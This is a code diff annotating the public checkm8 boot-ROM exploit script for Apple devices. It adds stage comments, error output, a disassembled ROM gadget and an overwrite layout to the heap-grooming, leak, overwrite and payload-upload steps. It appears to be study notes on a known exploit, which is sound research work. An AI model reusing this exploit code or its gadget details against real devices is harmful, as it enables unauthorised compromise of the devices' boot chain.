@@ -50,9 +50,9 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
     ret = device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
     print("ctrl transfer good: %d %d" % (bmRequestType, bRequest))
     #print("ctrl transfer", ret)
-  except usb.core.USBError:
+  except usb.core.USBError as e:
     #traceback.print_exc()
-    print("ctrl transfer ERROR: %d %d" % (bmRequestType, bRequest))
+    print("ctrl transfer ERROR: %d %d %r" % (bmRequestType, bRequest, e))
     pass
 
 def usb_rop_callbacks(address, func_gadget, callbacks):
@@ -119,6 +119,8 @@ def prepare_shellcode(name, constants=[]):
       assert value == 0xBAD00001 + i
 
   return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)
+
+# wValue = 0x304, wIndex = 0x40a
 
 def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
 def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
@@ -468,7 +470,7 @@ def exploit_config(serial_number):
 def exploit():
   print('*** checkm8 exploit by axi0mX ***')
 
-  print("****** stage 1")
+  print("****** stage 1, heap grooming")
   device = dfu.acquire_device()
   start = time.time()
   print('Found:', device.serial_number)
@@ -492,16 +494,17 @@ def exploit():
   dfu.usb_reset(device)
   dfu.release_device(device)
 
-  print("****** stage 2")
+  print("****** stage 2, usb setup, send 0x800 of 'A'")
   device = dfu.acquire_device()
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
-  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)  # this is erroring
+  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
+  #exit(0)
 
   time.sleep(0.5)
 
-  print("****** stage 3")
+  print("****** stage 3, exploit")
   device = dfu.acquire_device()
   usb_req_stall(device)
   if config.large_leak is not None:
@@ -510,15 +513,27 @@ def exploit():
     print("doing leak %d" % config.leak)
     for i in range(config.leak):
       usb_req_leak(device)
-  #print("overwrite: %r" % config.overwrite)
-  # what is this overwrite?
+
+  # this is the real smash, what's in overwrite
+  # t8010_nop_gadget = 0x10000CC6C
+  """
+  ROM:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0] ; this is the nop gadget?
+  ROM:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20
+  ROM:000000010000CC74                 RET
+  """
+  # t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q',             t8010_nop_gadget, 0x1800B0800)
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 10)
+
+  # upload the payload, or actually, this is after the pwning happens and this is exec
+  # this is usb_0xA1_2_arm64 and checkm8_arm64
   for i in range(0, len(payload), 0x800):
     libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 10)
+
+  # this is trigger?
   dfu.usb_reset(device)
   dfu.release_device(device)
 
-  print("****** stage 4")
+  print("****** final check")
   device = dfu.acquire_device()
   print("final serial", device.serial_number)
   if 'PWND:[checkm8]' not in device.serial_number:
@@ -528,3 +543,4 @@ def exploit():
     print('Device is now in pwned DFU Mode.')
     print('(%0.2f seconds)' % (time.time() - start))
   dfu.release_device(device)
+
